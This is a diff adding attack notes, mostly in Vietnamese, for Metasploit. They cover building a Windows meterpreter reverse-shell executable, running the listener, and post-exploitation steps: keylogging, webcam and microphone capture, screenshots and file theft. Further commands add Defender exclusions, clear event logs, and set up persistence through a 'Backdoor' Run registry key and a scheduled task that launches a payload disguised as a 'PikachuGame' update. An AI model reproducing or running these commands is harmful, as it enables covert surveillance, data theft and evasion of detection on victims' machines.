@@ -1,0 +1,82 @@
+sudo apt update 
+sudo msfdb init
+sudo apt install metasploit-framework
+
+
+// create
+sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.41.147 LPORT=4444 -f exe -o ~/Downloads/payload.exe
+
+ls ~/Downloads/payload.exe
+
+sudo msfconsole
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.41.147 
+set LPORT 4444
+exploit
+
+// kiem tra thong tin he thong
+meterpreter > sysinfo
+//liet ke tien trinh dang chay
+meterpreter > ps
+//truy cap he thong tep tin
+meterpreter > ls
+//man hinh
+meterpreter > screenshot
+// 
+meterpreter > shell
+// upload_file
+meterpreter > upload /path/to/local/file C:\\path\\to\\remote\\file
+// dowload_file
+meterpreter > download C:\\path\\to\\remote\\file /path/to/local/file
+meterpreter > download -r E:\abc /home/kali/Downloads
+
+// ghi keylog
+keyscan_start
+keyscan_dump
+keyscan_stop
+// gửi sự kiện phím vidu phim 13 la enter
+keyevent 13
+--------------------------------------------
+LHOST: Địa chỉ IP của máy Hacker (Nếu tấn công ngoài Internet thì xài IP Public, hoặc DDNS của No-IP.com)
+RHOST: Địa chỉ IP của máy Vicitm (Nếu tấn công ngoài Internet thì xài IP Public, RHOST có thể là URL Website cũng OK)
+LPORT: Port mở ra trên máy Hacker (Nếu tấn công ngoài Internet thì bắt buộc Port đó phải mở trên Router, còn hack trong mạng LAN thì port nào cũng được)
+RPORT: Port trên máy victim (Khi đi khai thác lỗ hổng, tùy lỗ hổng nằm trên giao thức nào thì có các RPORT đặc thù, thực chất Metasploit sẽ tự đặt cho các bạn)
+
+PAYLOAD: Có cấu trúc như sau (tên hệ điều hành/kiểu hệ thống/kiểu tấn công/giao thức tấn công)
+	Tên hệ điều hành: android hay windows
+	Kiểu hệ thống: x86 hay x64 (Nếu không biết thì bỏ qua)
+	Kiểu tấn công: meterpreter hay shell
+	Giao thức: reverse_tcp; reverse_tcp_dns; reverse_https
+	Ví dụ: windows/meterpreter/reverse_tcp_dns
+
+screenshot: Chụp ảnh màn hình Victim
+record_mic: Ghi âm mic
+webcam_list: Hiển thị danh sách webcam
+webcam_snap: Chụp ảnh qua webcam victim
+webcam_stream: Stream trực tiếp từ máy victim
+
+C:\Users\AD_DUC\Desktop\Project1.txt
+Add-MpPreference -ExclusionPath "C:\Users\AD_DUC\Desktop\Project1.txt"
+Add-MpPreference -ExclusionPath "E:\abc"
+
+// batch admin
+> execute -f powershell.exe -H -i
+
+step3: Add-MpPreference -ExclusionPath "C:\Users\AD_DUC\Desktop\Project1.txt"
+Add-MpPreference -ExclusionPath "C:\Program Files (x86)\PikachuGame"
+C:\Program Files (x86)\PikachuGame
+
+//
+ execute -f powershell.exe -H -i
+
+// xoa sự kiện
+Clear-EventLog -LogName "Application", "System", "Security"
+// thêm khóa "Run" của registry cho phép file tự run
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Program Files (x86)\PikachuGame\pikachuupdate.exe" /f
+
+// lap lich chay vao 8h toi hang ngay
+ execute -f cmd.exe -a "/c schtasks /create /tn PikachuUpdateTask /tr \"\"C:\\Program Files (x86)\\PikachuGame\\pikachuupdate.exe\"\" /sc daily /st 20:00 /f"
+
+// pikachuupdate.exe
